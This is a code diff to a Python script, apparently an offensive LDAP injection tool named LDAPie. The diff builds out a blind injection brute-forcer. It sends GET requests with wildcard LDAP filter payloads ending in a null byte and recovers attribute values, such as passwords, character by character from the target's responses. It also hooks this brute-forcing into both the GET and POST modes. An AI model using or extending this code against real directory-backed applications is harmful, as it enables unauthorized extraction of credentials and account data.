@@ -9,7 +9,6 @@
 # importing the modules we'll need
 
 import requests, sys, time, string
-import argparse as ap
 
 #Let's make things look a little bit better and easier for people to use
 print("""\033[1;36m
@@ -65,19 +64,17 @@ class LDAPie:
             return inj
 
     def bruteforce(self,inj,user,url):
-        val = None
-        user = sys.argv[5]
-        char = string.letters+string.digits+"""~!@#$%^&*()`-_=+[{]}\|;:'",<.>/?"""
+        val = ""
+        user = sys.argv[4]
+        char = string.letters+string.digits+"_@"
         url = sys.argv[7]
-        for i in range(1,100):
+        for i in range(len(char)):
             for x in char:
-                bf = requests.get(url+inj+val+x+"*))%00")
-                print(bf)
-            if user in r.content:
-                val += x
-                print("The Value For "+inj+" is "+val)
-#        break
-
+                bf = requests.get(url+'='+user+'*)('+inj+'='+val+x+"*))%00")
+                print(bf.url)
+                if user in bf.content:
+                    val += x
+                    break
 #main
 #SHOUT OUT TO RASTAMOUSE FOR THIS METHOD ON HOW TO HANDLE COMMANDLINE ARGS
 post = False
@@ -119,12 +116,14 @@ cl1 = len(l1)
 
 m = LDAPie(wordlist)
 if post == True:
-    p = m.post(wordlist,user,url)
-#    m.bruteforce(inj,user,url)
+    inj = m.post(wordlist,user,url)
+    for x in inj:
+        m.bruteforce(x,user,url)
     pass
 if get == True:
-    g = m.get(wordlist,user,url)
-#    m.bruteforce(inj,user,url)
+    inj = m.get(wordlist,user,url)
+    for x in inj:
+        m.bruteforce(x,user,url)
     pass
 
 elif get == False or post == False:
@@ -143,6 +142,7 @@ elif wordlist == None or url == None:
 -user			username
 -h                      help
 """)
-
-m.bruteforce(inj,user,url)
-print("The Value For "+x+" is "+val)
+#if inj is not None:
+#   for x in inj:
+#       m.bruteforce(x,user,url)
+#print("The Value For "+x+" is "+val)
